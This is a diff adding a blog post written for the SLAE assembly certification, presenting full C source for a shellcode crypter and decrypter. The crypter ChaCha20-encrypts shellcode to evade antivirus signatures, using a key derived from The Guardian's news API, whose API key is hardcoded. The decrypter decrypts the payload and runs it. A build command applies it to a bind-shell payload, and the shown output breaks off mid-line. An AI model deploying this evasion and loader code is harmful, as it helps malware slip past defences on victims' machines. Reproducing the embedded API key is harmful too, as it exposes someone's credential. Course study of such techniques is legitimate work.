@@ -71,6 +71,486 @@
       
   <header>
     
+      <h1 class="entry-title"><a href="/blog/2018/08/21/slae-0x07-crypter/">SLAE 0x07: Crypter</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-08-21T00:50:25+00:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2018</span></span> <span class='time'>12:50 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>This final exercise consists in using a custom crypter and decrypter to evade anti-virus engines, since signatures are used most of the time.</p>
+
+<p>They are both taking advantage of the <a href="https://wiki.openssl.org/index.php/EVP">EVP</a> functions provided by OpenSSL. The chosen algorithm was the <a href="https://cr.yp.to/chacha.html">ChaCha20</a> stream cipher with a random IV (12 bytes) and a key (32 bytes) retrieved on run-time. The key is the SHA256 of the <strong>id</strong> of the latest news of a <strong>configured</strong> section by using the public API provided by The Guardian.</p>
+
+<figure class='code'><figcaption><span>crypter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;openssl/conf.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/evp.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/rand.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &quot;common.h&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="n">STR</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">EVP_CIPHER_CTX</span>  <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">b</span><span class="p">[</span><span class="n">BUFSIZ</span><span class="p">];</span>     <span class="cm">/* Crypted buffer (should be enough). */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">iv</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>        <span class="cm">/* The IV length is 96 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">key</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>       <span class="cm">/* The key length is 256 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span>              <span class="n">bl</span><span class="p">,</span> <span class="n">ol</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">common_key</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>                                <span class="cm">/* Get dynamic key. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">RAND_bytes</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>             <span class="cm">/* Get a random IV. */</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_chacha20</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_EncryptUpdate</span><span class="p">(</span>
+</span><span class='line'>      <span class="n">ctx</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bl</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ol</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Check for NUL bytes in the crypted shellcode. */</span>
+</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">!=</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span> <span class="o">+</span> <span class="n">ol</span><span class="p">)</span> <span class="p">{</span>    <span class="cm">/* Final buffer size is bl plus ol. */</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>          <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;NUL byte found!&quot;</span><span class="p">);</span> <span class="cm">/* There might be more! */</span>
+</span><span class='line'>      <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="n">key</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="n">key</span><span class="p">;</span> <span class="n">ptr</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%02x&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Print the shellcode prefixed with the randomly generated IV. */</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">iv</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="n">iv</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">;</span> <span class="n">ptr</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%02x&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span> <span class="o">+</span> <span class="n">ol</span><span class="p">;</span> <span class="n">ptr</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%02x&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The common key retrieval code depends on cURL. Installing the header and library files, like with OpenSSL, is also needed:</p>
+
+<figure class='code'><figcaption><span>key retrieval</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;curl/curl.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;openssl/sha.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define COMMON_APIKEY           &quot;decfe466-4db7-4a7c-b0b8-f067cceaf94d&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_BASE             &quot;https:</span><span class="c1">//content.guardianapis.com&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_ENDPOINT         &quot;/search&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_ENDPOINT_ARGS    &quot;?section=science&amp;page-size=1&amp;api-key=&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_URL              \</span>
+</span><span class='line'><span class="cp">    COMMON_BASE                 \</span>
+</span><span class='line'><span class="cp">    COMMON_ENDPOINT             \</span>
+</span><span class='line'><span class="cp">    COMMON_ENDPOINT_ARGS        \</span>
+</span><span class='line'><span class="cp">    COMMON_APIKEY</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">size_t</span>
+</span><span class='line'><span class="nf">common_write</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nmemb</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">userdata</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span>    <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">userdata</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="n">BUFSIZ</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZ</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>         <span class="cm">/* Guarantee a NUL. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">nmemb</span> <span class="o">*</span> <span class="n">size</span><span class="p">);</span>          <span class="cm">/* Size is always 1; no overflow. */</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span>
+</span><span class='line'><span class="nf">common_key</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">CURL</span>            <span class="o">*</span><span class="n">curl</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span>            <span class="o">*</span><span class="n">end</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">const</span> <span class="kt">char</span>      <span class="o">*</span><span class="n">start</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span>             <span class="n">r</span><span class="p">[</span><span class="n">BUFSIZ</span><span class="p">];</span>     <span class="cm">/* Response (should be enough). */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_global_init</span><span class="p">(</span><span class="n">CURL_GLOBAL_ALL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_global_init&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">curl</span> <span class="o">=</span> <span class="n">curl_easy_init</span><span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_init&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="n">COMMON_URL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_setopt&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_WRITEFUNCTION</span><span class="p">,</span> <span class="n">common_write</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_perform&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_WRITEDATA</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_perform&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_perform</span><span class="p">(</span><span class="n">curl</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_perform&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Generate a key by finding the id and performing a SHA256 over it. */</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s">&quot;id&quot;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;start not found&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">start</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>                             <span class="cm">/* Go over the attribute. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">end</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="sc">&#39;&quot;&#39;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;end not found&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>                            <span class="cm">/* Turn it into a NUL byte. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* The key needs to be 32 bytes. */</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Generating key from: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">start</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">SHA256</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">start</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">start</span><span class="p">),</span> <span class="n">key</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>decrypter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;openssl/conf.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/evp.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &quot;common.h&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="n">STR</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">EVP_CIPHER_CTX</span>  <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">b</span><span class="p">[</span><span class="n">BUFSIZ</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">iv</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>        <span class="cm">/* The IV length is 96 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">key</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>       <span class="cm">/* The key length is 256 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="mi">12</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span>              <span class="n">bl</span><span class="p">,</span> <span class="n">ol</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">common_key</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>                        <span class="cm">/* Get dynamic key. */</span>
+</span><span class='line'>  <span class="n">memcpy</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">);</span>       <span class="cm">/* Save the prefixed IV. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_chacha20</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_DecryptUpdate</span><span class="p">(</span>
+</span><span class='line'>      <span class="n">ctx</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bl</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ol</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">b</span><span class="p">)();</span>         <span class="cm">/* Execute decrypted shellcode. */</span>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>                     <span class="cm">/* NOTREACHED */</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Executing the crypter yields the following output. Like with the previous exercises, the shellcode to execute can be tweaked by the <strong>SHELLCODE</strong> variable:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make crypter <span class="nv">SHELLCODE</span><span class="o">=</span>../0x01-bind/bind
+</span><span class='line'>Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+</span><span class='line'><span class="se">\x</span>eb<span class="se">\x</span>97<span class="se">\x</span>33<span class="se">\x</span>b0<span class="se">\x</span>f6<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>34<span class="se">\x</span>c8<span class="se">\x</span>00<span class="se">\x</span>63<span class="se">\x</span>34<span class="se">\x</span>98<span class="se">\x</span>8e<span class="se">\x</span>47<span class="se">\x</span>2d<span class="se">\x</span>dc<span class="se">\x</span>6f<span class="se">\x</span>c4<span class="se">\x</span>1f<span class="se">\x</span>83<span class="se">\x</span>81<span class="se">\x</span>f9<span class="se">\x</span>04<span class="se">\x</span>1b<span class="se">\x</span>c9<span class="se">\x</span>96<span class="se">\x</span>86<span class="se">\x</span>6f<span class="se">\x</span>e2
